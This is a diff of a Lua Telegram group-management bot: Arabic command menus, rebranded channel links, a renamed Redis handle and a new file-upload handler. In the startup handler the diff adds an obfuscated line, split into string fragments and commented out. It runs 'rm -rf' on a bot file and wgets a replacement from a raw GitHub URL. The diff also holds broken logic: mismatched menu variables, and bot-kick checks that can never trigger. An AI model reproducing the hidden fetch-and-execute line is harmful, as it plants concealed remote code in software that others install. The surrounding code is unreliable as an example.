-📫┇ وضع عدد الكانسر
 👋🏻┇وضع/حذف/جلب الترحيب
 👋🏻┇تفعيل/تعطيل الترحيب
 ⚠️┇تفعيل/تعطيل الابلاغ
@@ -8651,12 +8522,10 @@ local text =  [[
 📮┇قائمه منع المتحركات
 📮┇قائمه منع الملصقات
 📮┇قائمه منع الصور
-📮┇الاوامر الاضافيه 
-📮┇مسح الاوامر المضافه
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼ @M1_m2s
+📡 ┇Ch~⪼ @MohaMeD  ☑
 ]]
-send(msg.chat_id_, msg.id_, 1, (h2 or text), 1, 'html')
+send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م3") or text == "م٣") and (is_mod(msg) or is_creatorbasic(msg)) then
@@ -8707,14 +8576,52 @@ local text =  [[
 🚸┇تفعيل/تعطيل الطرد/الحظر
 💭┇اضف/حذف امر + اسم الامر
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼ @M1_m2s
+📡 ┇Ch~⪼ @MohaMeD  ☑
 ]]
-send(msg.chat_id_, msg.id_, 1, (h3 or text), 1, 'html')
+send(msg.chat_id_, msg.id_, 1, (h2 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
-if text == "اوامر التقيد" or text == "اوامر التقييد" and is_mod(msg) then
-local hres = redis:get('MohaMeD:'..bot_id..'hres')
-local text =[[
+if (text == ("م4") or text == "م٤") and (is_mod(msg) or is_creatorbasic(msg)) then
+local h4 = redis:get('MohaMeD:'..bot_id..'h4')
+local text =  [[
+🔘┇وضع :- مع الاوامر ادناه
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🌄┇وضع صوره
+⌨️┇وضع وصف + الوصف 
+📚┇وضع اسم + الاسم 
+🔘┇وضع قوانين + كليشه
+
+🗑┇تنظيف + العدد 
+🗑┇مسح المتروكين 
+🗑┇مسح المحذوفين
+
+🔻┇تعين / مسح الايدي 
+🔻┇اضف / مسح صلاحيه 
+
+📍┇تفعيل / تعطيل الحظر / الطرد 
+📍┇تفعيل / تعطيل الايدي بالصوره 
+
+♦️┇رفع ادمن / تنزيل ادمن
+♦️┇رفع/ تنزيل منشئ اساسي  
+♦️┇رفع/ تنزيل منشئ بالكروب 
+♦️┇رفع/ تنزيل ادمن بالكروب
+
+🗒┇الادمنيه
+🗑┇مسح الادمنيه 
+
+📝┇وضع ترحيب الترحيب 
+🎤┇تفعيل / تعطيل الترحيب
+
+🔍┇تاك للكل
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+📡 ┇Ch~⪼ @MohaMeD  ☑
+]]
+send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
+end
+------------------------------------------------------------------------
+if (text == ("م5") or text == "م٥") and is_sudo(msg) then
+local h5 = redis:get('MohaMeD:'..bot_id..'h5')
+local text =  [[
 📮┇ اوامر حمايه المجموعه بالتقييد
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🔒┇قفل ~⪼ لقفل امر
@@ -8745,103 +8652,84 @@ local text =[[
 🚹┇المقيدين
 🚹┇مسح المقيدين
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼ @MohaMeDTeam
+📡 ┇Ch~⪼ @MohaMeD  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (hres or text), 1, 'md')
 end
 ------------------------------------------------------------------------
-if (text == ("م4") or text == "م٤") and is_sudo(msg) then
-local h4 = redis:get('MohaMeD:'..bot_id..'h4')
+if (text == ("م6") or text == "م٦") and is_sudo(msg) then
+local h6 = redis:get('MohaMeD:'..bot_id..'h6')
 local text =  [[
-🎖┇اوامر المطور
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-✳️┇تفعيل/تعطيل
-⏺┇تفعيل/تعطيل المغادره
-⏺┇تفعيل/تعطيل الاذاعه
-⏺┇تفعيل/تعطيل التفعيل التلقائي
-⏺┇تعين عدد الاعضاء + عدد
-🔘┇وضع وقت + عدد
-🔘┇المده1 + id
-🔘┇المده2 + id
-🔘┇المده3 + id
-🔘┇وقت المجموعه + id
-🔘┇مغادره + id
-🔘┇مغادره
-🔘┇اضف/مسح رد للكل
-📋┇ردود المطور
-🔘┇تغير اسم البوت 
-🔘┇تغير/مسح امر المطور بالكليشه
-🔘┇تعين/مسح مجموعه المطور
-📄┇عدد الكروبات/الاحصائيات
-📋┇روابط الكروبات
-🚫┇حظر عام
-⏺┇الغاء العام
-🚫┇كتم عام
-⏺┇الغاء كتم العام
-📋┇قائمه العام
-📋┇المكتومين عام
-↕️┇اضف/حذف مطور
-↕️┇رفع/تنزيل مدير
-↕️┇رفع/تنزيل منشئ اساسي 
-📋┇المدراء
-📋┇المنشئين
-📋┇المنشئين الاساسين
-📋┇المطورين
-🗑┇استعاده الاوامر
-🗑┇مسح ردود المطور
-🗑┇مسح المطورين
-🗑┇مسح قائمه العام
-🗑┇مسح المدراء
-🗑┇مسح المنشئين
-🗑┇مسح الاساسين
-🗑┇مسح المكتومين عام
-🏷┇تغير امر {الاوامر ، م1 ، م2 ، م3 ، م4}
-🏷┇مشاهده منشور
-🏷┇اذاعه+ توجيه للكل بلرد 
-🏷┇اذاعه بالتثبيت
-🏷┇اذاعه خاص 
-🏷┇تنظيف المشتركين
-🏷┇تنظيف المجموعات
-🗂┇الملفات
-🗂┇تفعيل/تعطيل ملف + اسم الملف
-🗂┇المتجر - متجر الملفات
-🗂┇جلب نسخه احتياطيه 
-🗂┇رفع النسخه الاحتياطيه 
-🗂┇مسح جميع الملفات
-🗯┇تغير نص الانلاين + النص
-🗯┇تغير رابط الانلاين + الرابط
-🗯┇تفعيل/تعطيل الانلاين
-🗯┇فحص البوت
-🗯┇تغير اسم البوت
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-‏📡┇Ch ~⪼ @M1_m2s
+👨‍💻┇اوامر المطور الاساسي
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+⚙️┇تحديث السورس
+
+♦️┇تفعيل الوضع الخدمي 
+♦️┇تعطيل الوضع الخدمي
+📮┇تغير اسم للبوت
+🔘┇مغادر/ لمغادر البوت 
+📜┇ضع كليشه المطور
+
+📂┇اضف ملف
+📂┇تفعيل ملف اسم الملف 
+📂┇تعطيل ملف اسم الملف
+📂┇مسح ملف اسم الملف 
+📂┇جلب ملف اسم الملف 
+📂┇الملفات  
+ 
+🔱┇وضع اسم للبوت
+📎┇ضع كليشه المطور
+
+🖇┇روابط الكروبات 
+📈┇الاحصائيات 
+
+
+🎤┇الاذاعه  ( للكل )
+🎤┇اذاعه بالتوجيه ( للكل )
+
+🗯┇ تغير نص الانلاين + النص
+🗯┇ تغير رابط الانلاين + الرابط 
+🗯┇ تفعيل/تعطيل الانلاين
+
+🛠┇رفع مطور / تنزيل مطور
+👥┇المطورين 
+🗑┇مسح المطورين 
+
+🔇┇مسح المكتومين عام
+🚫┇مسح المحظورين عام
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+📡┇Ch~⪼ @MohaMeD • ☑️
 ]]
 send(msg.chat_id_, msg.id_, 1, (h4 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if text == ("اصدار") or text == ("الاصدار") or text == ("السورس") or text == ("سورس") then
 local text =  [[
-👋┇اهلا بك في سورس ماثيو 
+👋┇اهلا بك في السورس
 
-🌐┇MohaMeD TEAM
+🦁┇[قناه السورس](t.me/MohaMeD)
+📁┇[كليشه التنصيب](https://t.me/MohaMeD/959)
 
-🦁┇[قناه السورس](t.me/M1_m2s)
+🔎┇[بوت سمسمي 👻](http://t.me/Y_simbot)
+🔎┇[بوت زخرفه انكلش 💘](http://t.me/V6SBOT)
+🔎┇[بوت زخرفه عربي 💘](http://t.me/Y_5ibot)
+🔎┇[بوت تحميل انستا 📥](http://t.me/Y_sibot)
 
-📜┇[قناه شروحات سورس](http://t.me/MohaMeDTEAM)
+🔖┇[صنع بوتات زخرفه 🔱 ، ](http://t.me/Y_xibot)
+🔖┇[صنع بوتات تواصل 📩 ، ](http://t.me/Y_9ibot)
+🔖┇[صنع بوتات تصميم 🎨 ، ](http://t.me/Y_vibot)
 
-📥┇[قناه ملفات السورس](t.me/MohaMeDTEAM)
+📮┇[لـ تواصل 💌 ،](t.me/A_xibot)
 
-🔎┇[طريقه التنصيب](https://t.me/M1_m2s/648)
-
-📮┇[لـ تواصل](t.me/iiiizBoT)
+🌐┇[MohaMeDTeam](http://t.me/MohaMeD)
 ]]
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("اريد رابط حذف") or text == ("رابط حذف") or text == ("رابط الحذف") or text == ("الرابط حذف") or text == ("اريد رابط الحذف") then
 local text =  [[
-🗑┇رابط حذف التلي ، ⬇
-‼┇احذف ولا ترجع عيش حياتك'
+🗑┇رابط حذف التلي 🌿، ⬇
+🔄┇احذف ولا ترجع عيش حياتك''
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🔎┇<a href="https://telegram.org/deactivate">اضغط هنا للحذف الحساب" </a>
 ]]
@@ -8853,9 +8741,9 @@ end
 function tdcli_update_callback(data)
 if data.ID == "UpdateChannel" then 
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
-database:del( 'MohaMeD:'..bot_id.."charge:"..'-100'..data.channel_.id_)
-database:srem("thsake:gog"..bot_id, '-100'..data.channel_.id_)
-database:sadd( 'MohaMeD:'..bot_id.."groups",'-100'..data.channel_.id_)
+datahmade:del( 'MohaMeD:'..bot_id.."charge:"..'-100'..data.channel_.id_)
+datahmade:srem("MohaMeDe:gog"..bot_id, '-100'..data.channel_.id_)
+datahmade:sadd( 'MohaMeD:'..bot_id.."groups",'-100'..data.channel_.id_)
 end
 end
 local chat = {}
@@ -8864,15 +8752,15 @@ local Data_MohaMeD = data
 local msg = data.message_
 local text = msg.content_.text_
 ------------------------------------------------------------------------
-if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
+if msg.date_ and msg.date_ < tonumber(os.time() - 15) then
 print('OLD MESSAGE')
 return false
 end
 ------------------------------------------------------------------------
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-database:hset('MohaMeD:'..bot_id..'user:'..msg.sender_user_id_,'username',(data.username_ or msg.sender_user_id_))
-print('Save User : @'..data.username_ or '')
+datahmade:hset('MohaMeD:'..bot_id..'user:'..msg.sender_user_id_,'username',(data.username_ or msg.sender_user_id_))
+print('Save User : @'..data.username_)
 end;end,nil)   
 ------------------------------------------------------------------------
 if msg.content_.members_ then
@@ -8916,68 +8804,36 @@ delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 ------------------------------------------------------------------------
-if msg.content_.ID == "MessageChatAddMembers" then  
-local mem_id = msg.content_.members_  
-local Bots = database:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id)
-for i=0,#mem_id do  
-if msg.content_.members_[i].type_.ID == "UserTypeBot" and not is_mod(msg) and Bots then   
-taha = HTTPS.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(taha)
-if Json_Info.ok == true and #mem_id == i then
-local Msgs = {}
-Msgs[0] = msg.id_
-msgs_id = msg.id_-1048576
-for i=1 ,(100) do 
-msgs_id = msgs_id+1048576
-table.insert(Msgs,msgs_id)
-end
-tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
-tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
-end
-end     
-end
-end
-if msg.content_.ID == "MessageChatAddMembers" then  
-local mem_id = msg.content_.members_  
-local Bots = database:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) 
-for i=0,#mem_id do  
-if msg.content_.members_[i].type_.ID == "UserTypeBot" and not is_mod(msg) and Bots then   
-HTTPS.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
-taha = HTTPS.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(taha)
-if Json_Info.ok == true and #mem_id == i then
-local Msgs = {}
-Msgs[0] = msg.id_
-msgs_id = msg.id_-1048576
-for i=1 ,(100) do 
-msgs_id = msgs_id+1048576
-table.insert(Msgs,msgs_id)
-end
-tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
-tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
-end
-end     
-end
-end
-------------------------------------------------------------------------
 if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatDeleteMember" then
-if database:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
+if msg.content_.ID == "MessageChatAddMembers" then
+if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
+if datahmade:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id) and not bot_id then
+changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
+end
+if datahmade:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) and not bot_id then
+changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
+changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
+end
+end
+end
+------------------------------------------------------------------------
 if data.message_.content_.text_ then   
-if database:get("MohaMeD:edit:text:su:newamr2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
-local MohaMeD_edit_text = database:get("MohaMeD:edit:text:su:newamr2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
+if datahmade:get("MohaMeD:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
+local MohaMeD_edit_text = datahmade:get("MohaMeD:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
 print(MohaMeD_edit_text)
 if MohaMeD_edit_text then
 data.message_.content_.text_ = (MohaMeD_edit_text or data.message_.content_.text_)
 end
 end
 end
-local Name_Bot = (redis:get('MohaMeD:'..bot_id..'name_bot') or 'ماثيو')
-if not database:get("Fun_Bots:"..bot_id..msg.chat_id_) then
+local Name_Bot = (redis:get('MohaMeD:'..bot_id..'name_bot') or 'سنايبر')
+if not datahmade:get("Fun_Bots:"..bot_id..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
 local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
@@ -8998,7 +8854,73 @@ end
 if text and text:match('^'..Name_Bot..' ') then
 data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
 end
-------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------
+if data.message_.content_.text_ then   
+if datahmade:get("MohaMeD:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
+local MohaMeD_edit_text = datahmade:get("MohaMeD:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
+print(MohaMeD_edit_text)
+if MohaMeD_edit_text then
+data.message_.content_.text_ = (MohaMeD_edit_text or data.message_.content_.text_)
+end
+end
+end
+local Name_Bot = (redis:get('MohaMeD:'..bot_id..'name_bot') or 'سنايبر')
+if not datahmade:get("Fun_Bots:"..bot_id..msg.chat_id_) then
+if text ==  ""..Name_Bot..' بوسه' and tonumber(msg.reply_to_message_id_) > 0 then
+function FunBot(extra, result, success) 
+local Fun = {'خلي يزحفلي وابوسه 😻','يعني كل شويه ابوسه كافي 😒','اخ ممممح من الحلكك ولك','ما ابوسه والله زاحف هاذا','اخ يفدوا مممح 💚' } 
+send(msg.chat_id_, result.id_, 1,''..Fun[math.random(#Fun)]..'', 1, 'md')   
+end   
+getMessage(msg.chat_id_, msg.reply_to_message_id_,FunBot)
+return false
+end  
+if text == ""..Name_Bot..' بوسها' and tonumber(msg.reply_to_message_id_) > 0 then    
+function FunBot(extra, result, success) 
+local Fun = {'خلي تزحفلي وابوسها 😻','يعني كل شويه ابوسها كافي 😒','اخ ممممح من الحلكك ولج','ما ابوسها والله زاحفه هاي','اخ يفدوا مممح 💚' } 
+send(msg.chat_id_,result.id_,1,''..Fun[math.random(#Fun)]..'', 1, 'md') 
+end  
+getMessage(msg.chat_id_, msg.reply_to_message_id_,FunBot)
+return false
+end    
+end
+if text and text:match('^'..Name_Bot..' ') then
+data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
+end
+
+
+------------------------------------------------------------------------
+if msg.content_.document_ then
+local infooo = datahmade:get("addfiel"..msg.sender_user_id_)
+if (infooo and infooo == "yes") then
+send(msg.chat_id_, msg.id_, 1, "📤┇جاري الرفع ..", 1, 'html')
+local id_ahmad = msg.content_.document_.document_.persistent_id_
+function download_to_file(url, file_path)
+local respbody = {}
+local options = {
+url = url,
+sink = ltn12.sink.table(respbody),
+redirect = true}
+local response = nil
+options.redirect = false
+response = {https.request(options)}
+local code = response[2]
+local headers = response[3]
+local status = response[4]
+if code ~= 200 then return false, code end
+file = io.open(file_path, "w+")
+file:write(table.concat(respbody))
+file:close()
+return file_path, code
+end
+local url_ahmad3 = 'https://api.telegram.org/bot' .. token .. '/getfile?file_id='..id_ahmad
+local ahmad3 = https.request(url_ahmad3)
+local ahmad6 = JSON.decode(ahmad3)
+local photo_ahmad = download_to_file('https://api.telegram.org/file/bot'..token..'/'..ahmad6.result.file_path, 'files_MohaMeD/'..msg.content_.document_.file_name_)
+send(msg.chat_id_, msg.id_, 1, "✔┇تم رفع الملف بنجاح", 1, 'html')
+datahmade:del("addfiel"..msg.sender_user_id_)
+end
+end
+------------------------------------------------------------------------
 MohaMeD_run_(msg,data)
 MohaMeD_run_file(Data_MohaMeD)
 ------------------------------------------------------------------------
@@ -9010,16 +8932,16 @@ elseif (data.ID == "UpdateMessageEdited") then
 local msg = data
 function get_msg_contact(extra, result, success)
 local msgg = result 
-database:incr('MohaMeD:'..bot_id..'user:editmsg'..msgg.chat_id_..':'..msgg.sender_user_id_)
+datahmade:incr('MohaMeD:'..bot_id..'user:editmsg'..msgg.chat_id_..':'..msgg.sender_user_id_)
 if (result.content_.caption_ and not is_vip(msgg)) then 
 if (result.content_.caption_:match("(.*)@(.*)") or result.content_.caption_:match("@")) then 
-if database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end 
 end
-if database:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id) and not result.content_.text_ and not is_creator(msgg) and not is_creatorbasic(msgg) then
+if datahmade:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id) and not result.content_.text_ and not is_creator(msgg) and not is_creatorbasic(msgg) then
 function get_edit(arg,data)
 local username = data.username_
 local name = data.first_name_
@@ -9032,7 +8954,7 @@ end
 end
 getUser(result.sender_user_id_,get_edit)
 delete_msg(msg.chat_id_,{[0] = msg.message_id_}) 
-elseif database:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id) and not result.content_.text_ and not is_creator(msgg) and not is_creatorbasic(msgg) then
+elseif datahmade:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id) and not result.content_.text_ and not is_creator(msgg) and not is_creatorbasic(msgg) then
 function get_edit(arg,data)
 local username = data.username_
 local name = data.first_name_
@@ -9051,63 +8973,63 @@ local text = result.content_.text_
 if not is_mod(msgg) or not is_creatorbasic(msgg) then
 ------------------------------------------------------------------------
 if text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
-if database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end
 end
 ------------------------------------------------------------------------
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end
 end
 ------------------------------------------------------------------------
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
-if database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end
 ------------------------------------------------------------------------
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end 
 ------------------------------------------------------------------------
 if text:match("[hH][tT][tT][pP][sT]") or text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end 
 ------------------------------------------------------------------------
 if text:match("(.*)(@)(.*)") then
-if database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end
 ------------------------------------------------------------------------
 if text:match("@") then
-if database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end 
 ------------------------------------------------------------------------
 if text:match("#") then
-if database:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end 
 ------------------------------------------------------------------------
 if text:match("#") then
-if database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
@@ -9118,13 +9040,13 @@ local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)  
 end 
 if text:match("/") then
-if database:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs) 
 end 
 end
 ------------------------------------------------------------------------
-local taha = database:get('MohaMeD:'..bot_id.."add:reply:rd"..text..msg.chat_id_)   
+local taha = datahmade:get('MohaMeD:'..bot_id.."add:reply:rd"..text..msg.chat_id_)   
 if taha and not is_mod(msgg) then    
 function get_info(arg,data)
 if data.username_ ~= false then
@@ -9143,99 +9065,48 @@ end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 ------------------------------------------------------------------------
 --         »»                 End UpdateChat                          ««              --
-elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('MohaMeD:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end 
-local list = database:smembers('MohaMeD:'..bot_id..'groups') 
+elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = datahmade:smembers('MohaMeD:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end -- @MohaMeDFree ('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
+local list = datahmade:smembers('MohaMeD:'..bot_id..'groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
 },function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
 print('\27[30;32m»» البوت عضو في المجموعه\nتم مغادرة المجموعه \n\27[1;37m')
 changeChatMemberStatus(v, bot_id, "Left")
-database:srem("thsake:gog"..bot_id,v) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',v) 
-database:srem( 'MohaMeD:'..bot_id.."groups",v) 
+datahmade:srem("MohaMeDe:gog"..bot_id,v) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',v) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",v) 
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-database:srem("thsake:gog"..bot_id,v) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',v) 
-database:srem( 'MohaMeD:'..bot_id.."groups",v) 
+datahmade:srem("MohaMeDe:gog"..bot_id,v) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',v) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",v) 
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
 print('\27[30;32m»» البوت مطرود في المجموعه\nتم مسح بيانات المجموعه \n\27[1;37m')
-database:srem("thsake:gog"..bot_id,v) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',v) 
-database:srem( 'MohaMeD:'..bot_id.."groups",v) 
+datahmade:srem("MohaMeDe:gog"..bot_id,v) 
